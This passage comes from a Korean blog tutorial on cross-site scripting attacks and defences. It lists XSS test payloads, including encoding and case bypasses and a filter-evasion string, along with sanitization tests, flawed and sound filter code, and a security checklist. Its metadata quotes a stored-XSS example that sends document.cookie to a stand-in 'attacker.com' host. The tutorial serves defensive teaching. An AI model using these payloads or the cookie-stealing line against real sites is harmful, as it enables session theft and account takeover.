class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>hover me<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- JavaScript 프로토콜 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Data URI --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 인코딩 우회 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#39;</span>XSS<span class="symbol">&amp;#39;</span><span class="symbol">&amp;#41;</span>&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 대소문자 우회 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- HTML 엔티티 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 속성 없는 태그 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">88</span>,<span class="number">83</span>,<span class="number">83</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="자동화-테스트"><a href="#자동화-테스트" class="headerlink" title="자동화 테스트"></a>자동화 테스트</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Jest + React Testing Library</span></span><br><span class="line"><span class="keyword">import</span> &#123; render, screen &#125; <span class="keyword">from</span> <span class="string">&#x27;@testing-library/react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">DOMPurify</span> <span class="keyword">from</span> <span class="string">&#x27;dompurify&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;XSS 공격이 차단되는지 확인&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> maliciousInput = <span class="string">&#x27;&lt;img src=x onerror=&quot;alert(\&#x27;XSS\&#x27;)&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> sanitized = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(maliciousInput);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">expect</span>(sanitized).<span class="property">not</span>.<span class="title function_">toContain</span>(<span class="string">&#x27;onerror&#x27;</span>);</span><br><span class="line">  <span class="title function_">expect</span>(sanitized).<span class="property">not</span>.<span class="title function_">toContain</span>(<span class="string">&#x27;alert&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;정상적인 HTML은 허용되는지 확인&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> safeInput = <span class="string">&#x27;&lt;b&gt;Hello&lt;/b&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> sanitized = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(safeInput);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">expect</span>(sanitized).<span class="title function_">toBe</span>(<span class="string">&#x27;&lt;b&gt;Hello&lt;/b&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JUnit + Spring Boot</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">testXssProtection</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">maliciousComment</span> <span class="operator">=</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    mockMvc.perform(post(<span class="string">&quot;/api/comments&quot;</span>)</span><br><span class="line">            .contentType(MediaType.APPLICATION_JSON)</span><br><span class="line">            .content(<span class="string">&quot;&#123;\&quot;content\&quot;:\&quot;&quot;</span> + maliciousComment + <span class="string">&quot;\&quot;&#125;&quot;</span>))</span><br><span class="line">            .andExpect(status().isBadRequest())</span><br><span class="line">            .andExpect(jsonPath(<span class="string">&quot;$.message&quot;</span>)</span><br><span class="line">                .value(containsString(<span class="string">&quot;HTML 태그는 허용되지 않습니다&quot;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="⚠️-주의사항"><a href="#⚠️-주의사항" class="headerlink" title="⚠️ 주의사항"></a>⚠️ 주의사항</h2><h3 id="잘못된-방어-방법"><a href="#잘못된-방어-방법" class="headerlink" title="잘못된 방어 방법"></a>잘못된 방어 방법</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ❌ 블랙리스트 방식 (우회 가능)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">badFilter</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> input.<span class="title function_">replace</span>(<span class="regexp">/&lt;script&gt;/gi</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 우회: &lt;scr&lt;script&gt;ipt&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ❌ 불완전한 이스케이프</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">badEscape</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> input.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 누락: &#x27;, &quot;, &amp;, / 등</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ❌ 클라이언트 측 검증만 의존</span></span><br><span class="line"><span class="comment">// 공격자는 브라우저 개발자 도구로 우회 가능</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="올바른-방어-방법"><a href="#올바른-방어-방법" class="headerlink" title="올바른 방어 방법"></a>올바른 방어 방법</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ✅ 화이트리스트 방식</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">allowOnlyText</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> input.<span class="title function_">replace</span>(<span class="regexp">/[^\w\s가-힣]/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 완전한 HTML 엔티티 인코딩</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">properEscape</span>(<span class="params">text</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> text.<span class="title function_">replace</span>(<span class="regexp">/[&amp;&lt;&gt;&quot;&#x27;\/]/g</span>, <span class="function"><span class="params">char</span> =&gt;</span> (&#123;</span><br><span class="line">    <span class="string">&#x27;&amp;&#x27;</span>: <span class="string">&#x27;&amp;amp;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;&#x27;</span>: <span class="string">&#x27;&amp;lt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;&#x27;</span>: <span class="string">&#x27;&amp;gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&quot;&#x27;</span>: <span class="string">&#x27;&amp;quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;&#x27;&quot;</span>: <span class="string">&#x27;&amp;#039;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;&amp;#x2F;&#x27;</span></span><br><span class="line">  &#125;)[char]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 라이브러리 사용</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">DOMPurify</span> <span class="keyword">from</span> <span class="string">&#x27;dompurify&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(input);</span><br></pre></td></tr></table></figure>
+
+<h2 id="✅-보안-체크리스트"><a href="#✅-보안-체크리스트" class="headerlink" title="✅ 보안 체크리스트"></a>✅ 보안 체크리스트</h2><ul>
+<li><input disabled type="checkbox"> 모든 사용자 입력에 대해 서버 측 검증 수행</li>
+<li><input disabled type="checkbox"> 출력 시 자동 이스케이프 적용 (템플릿 엔진)</li>
+<li><input disabled type="checkbox"> CSP 헤더 설정</li>
+<li><input disabled type="checkbox"> HttpOnly, Secure 쿠키 사용</li>
+<li><input disabled type="checkbox"> innerHTML, dangerouslySetInnerHTML 사용 최소화</li>
+<li><input disabled type="checkbox"> eval(), setTimeout(string), Function(string) 사용 금지</li>
+<li><input disabled type="checkbox"> DOMPurify 같은 검증된 라이브러리 사용</li>
+<li><input disabled type="checkbox"> 정기적인 보안 테스트 및 코드 리뷰</li>
+<li><input disabled type="checkbox"> 프레임워크 및 라이브러리 최신 버전 유지</li>
+<li><input disabled type="checkbox"> HTTPS 사용 강제</li>
+</ul>
+<h2 id="🎓-결론"><a href="#🎓-결론" class="headerlink" title="🎓 결론"></a>🎓 결론</h2><p>XSS는 <strong>사용자 입력을 신뢰하지 않는 것</strong>이 핵심입니다.</p>
+<p><strong>핵심 방어 원칙:</strong></p>
+<ol>
+<li><strong>입력 검증</strong> - 서버에서 모든 입력 검증</li>
+<li><strong>출력 인코딩</strong> - Context-aware 인코딩 적용</li>
+<li><strong>CSP 설정</strong> - 스크립트 실행 제어</li>
+<li><strong>HttpOnly 쿠키</strong> - JavaScript로 쿠키 접근 차단</li>
+<li><strong>라이브러리 활용</strong> - DOMPurify 등 검증된 도구 사용</li>
+</ol>
+<p>단일 방어보다는 **여러 계층의 방어(Defense in Depth)**를 구축하여<br>하나가 뚫려도 다른 방어선에서 막을 수 있도록 해야 합니다.</p>
+
+        </div>
+        <footer class="article-footer">
+            
+
+
+
+    <a data-url="https://ckck803.github.io/2025/12/04/security/xss/" data-id="cmjglsiqz00ac288d1emafy7n" class="article-share-link"><i class="fa fa-share"></i>Share</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
+    </div>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "author": {
+            "@type": "Person",
+            "name": "ckck803"
+        },
+        "headline": "[Web Security] XSS 공격과 방어 기법 완벽 가이드",
+        "image": "https://ckck803.github.io",
+        "keywords": "Web Security XSS JavaScript CSP",
+        "genre": "Security",
+        "datePublished": "2025-12-04",
+        "dateCreated": "2025-12-04",
+        "dateModified": "2025-12-08",
+        "url": "https://ckck803.github.io/2025/12/04/security/xss/",
+        "description": "🎯 XSS(Cross-Site Scripting)란?XSS는 공격자가 웹 페이지에 악성 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행시키는 공격입니다.사용자의 쿠키, 세션 토큰을 탈취하거나, 사용자인 척 행동할 수 있습니다.
+XSS vs CSRF 차이점
+
+
+구분
+XSS
+CSRF
+
+
+
+공격 대상
+웹사이트의 사용자
+웹사이트의 서버
+
+
+공격 방식
+악성 스크립트 실행
+사용자 권한으로 요청 전송
+
+
+주요 수단
+JavaScript 주입
+자동 폼 제출, 이미지 태그
+
+
+탈취 가능
+쿠키, 세션, DOM, 키 입력 등
+불가능 (요청만 가능)
+
+
+🔍 XSS 공격 유형1. Stored XSS (저장형)악성 스크립트가 서버 데이터베이스에 저장되어, 해당 페이지를 보는 모든 사용자에게 실행됩니다.가장 위험한 XSS 공격입니다.
+공격 시나리오// 게시판 댓글 작성const comment = &#x27;&lt;script&gt;  fetch(&quot;https://attacker.com/steal?cookie=&quot; + document.cookie);&lt;/script&gt;&#x27;;// 서버에 저장됨// DB: comments 테이블에 위 스크립트가 그대로 저장// 다른 사용자가 게시글을 볼 때&lt;div class=&quot;comment&quot;&gt;  &lt;script&gt;    fetch(&quot;https://attacker.com/steal?cookie=&quot; + document.cookie);  &lt;/script&gt;&lt;/div&gt;// ⚠️ 모든 방문자의 쿠키가 탈취됨!
+
+실제 사례",
+        "wordCount": 4528
+    }
+</script>
+
+</article>
+
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
+
+    
+    </section>
+
+
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>follow:</p>
+        <ul class="social-links">
+            
+                
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/ckck803" target="_blank" rel="external nofollow noopener noreferrer">
+                        <i class="icon fa fa-github"></i>
+                    </a>
+                </li>
+                
+            
+        </ul>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+        <a href="/2025/12/04/security/csrf/" id="article-nav-newer" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">newer</strong>
+        <p class="article-nav-title">
+        
+            [Web Security] CSRF 공격과 방어 기법 완벽 가이드
+        
+        </p>
+        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
+    </a>
+    
+    
+        <a href="/2025/12/01/database/postgresql/user-security-settings/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">older</strong>
+        <p class="article-nav-title">[PostgreSQL] 사용자별 보안 설정 가이드</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
+    
+    <div class="widgets-container">
+        
+            
+                
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">categories</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AWS/">AWS</a><span class="category-list-count">9</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/AWS/EKS/">EKS</a><span class="category-list-count">9</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CS/">CS</a><span class="category-list-count">61</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CS/DataBase/">DataBase</a><span class="category-list-count">18</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CS/DataBase/SQL/">SQL</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CS/DataBase/Scan/">Scan</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CS/DataBase/Transaction/">Transaction</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CS/Network/">Network</a><span class="category-list-count">22</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CS/Network/HTTP/">HTTP</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CS/Network/Security/">Security</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CS/Process/">Process</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CS/%EC%9A%B4%EC%98%81%EC%B2%B4%EC%A0%9C/">운영체제</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CS/%EC%BB%B4%ED%93%A8%ED%84%B0-%EA%B5%AC%EC%A1%B0/">컴퓨터 구조</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CS/%EC%BB%B4%ED%93%A8%ED%84%B0-%EA%B5%AC%EC%A1%B0/%EB%A9%94%EB%AA%A8%EB%A6%AC-%EA%B4%80%EB%A6%AC/">메모리 관리</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CS/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%B0%8D-%EC%96%B8%EC%96%B4/">프로그래밍 언어</a><span class="category-list-count">8</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CS/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%B0%8D-%EC%96%B8%EC%96%B4/JAVA/">JAVA</a><span class="category-list-count">4</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Database/">Database</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Database/PostgreSQL/">PostgreSQL</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/">DevOps</a><span class="category-list-count">23</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/CICD/">CICD</a><span class="category-list-count">11</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/CICD/Jenkins/">Jenkins</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/CICD/Repository/">Repository</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Jmeter/">Jmeter</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/KeyCloak/">KeyCloak</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Kiali/">Kiali</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Maven/">Maven</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/OpenSearch/">OpenSearch</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Repository/">Repository</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Repository/Gitea/">Gitea</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/SonarQube/">SonarQube</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/">Develop</a><span class="category-list-count">184</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Beakjoon/">Beakjoon</a><span class="category-list-count">40</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Beakjoon/BFS/">BFS</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Beakjoon/DFS/">DFS</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Beakjoon/SAMSUNG/">SAMSUNG</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Beakjoon/SAMSUNG/%EC%8B%9C%EB%AE%AC%EB%A0%88%EC%9D%B4%EC%85%98/">시뮬레이션</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Beakjoon/%EA%B2%BD%EC%9A%B0%EC%9D%98-%EC%88%98/">경우의 수</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Beakjoon/%EA%B7%B8%EB%9E%98%ED%94%84/">그래프</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Beakjoon/%EB%8B%A4%EC%9D%B5%EC%8A%A4%ED%8A%B8%EB%9D%BC/">다익스트라</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Beakjoon/%EC%8B%9C%EB%AE%AC%EB%A0%88%EC%9D%B4%EC%85%98/">시뮬레이션</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Beakjoon/%EC%9D%B4%EB%B6%84%ED%83%90%EC%83%89/">이분탐색</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Beakjoon/%EC%9E%90%EB%A3%8C%EA%B5%AC%EC%A1%B0/">자료구조</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Beakjoon/%EC%9E%90%EB%A3%8C%EA%B5%AC%EC%A1%B0/List/">List</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Beakjoon/%EC%9E%90%EB%A3%8C%EA%B5%AC%EC%A1%B0/SET/">SET</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Beakjoon/%EC%9E%90%EB%A3%8C%EA%B5%AC%EC%A1%B0/%EC%8A%A4%ED%83%9D/">스택</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Beakjoon/%EC%B9%B4%ED%85%8C%EA%B3%A0%EB%A6%AC/">카테고리</a><span class="category-list-count">14</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Cpp/">Cpp</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Cpp/STL/">STL</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Django/">Django</a><span class="category-list-count">32</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Docker/">Docker</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Docker/Docker-Compose/">Docker Compose</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Git/">Git</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/JAVA/">JAVA</a><span class="category-list-count">16</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/JAVA/Collection/">Collection</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/JAVA/REST/">REST</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/JAVA/Rest/">Rest</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/JPA/">JPA</a><span class="category-list-count">26</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/JPA/JPA-%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%B0%8D-%EA%B8%B0%EB%B3%B8%ED%8E%B8/">JPA 프로그래밍(기본편)</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/JPA/%EC%97%B0%EA%B4%80%EA%B4%80%EA%B3%84/">연관관계</a><span class="category-list-count">13</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Kafka/">Kafka</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/MySQL/">MySQL</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Oracle/">Oracle</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/QueryDSL/">QueryDSL</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/Redis/">Redis</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</a><span class="category-list-count">23</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/%EA%B2%BD%EC%9A%B0%EC%9D%98-%EC%88%98/">경우의 수</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/%EA%B2%BD%EC%9A%B0%EC%9D%98-%EC%88%98/%EC%A4%91%EB%B3%B5-%EC%88%9C%EC%97%B4/">중복 순열</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/%EB%AC%B8%EC%9E%90%EC%97%B4/">문자열</a><span class="category-list-count">9</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/%EB%AC%B8%EC%9E%90%EC%97%B4/%EC%A0%95%EA%B7%9C-%ED%91%9C%ED%98%84%EC%8B%9D/">정규 표현식</a><span class="category-list-count">6</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/%EC%9E%90%EB%A3%8C%EA%B5%AC%EC%A1%B0/">자료구조</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/%EC%9E%90%EB%A3%8C%EA%B5%AC%EC%A1%B0/SET/">SET</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/%EC%9E%90%EB%A3%8C%EA%B5%AC%EC%A1%B0/%EC%8A%A4%ED%83%9D/">스택</a><span class="category-list-count">1</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Django/">Django</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Django/Python/">Python</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Frontend/">Frontend</a><span class="category-list-count">57</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Frontend/Login/">Login</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Frontend/React/">React</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Frontend/React/TypeScript/">TypeScript</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" 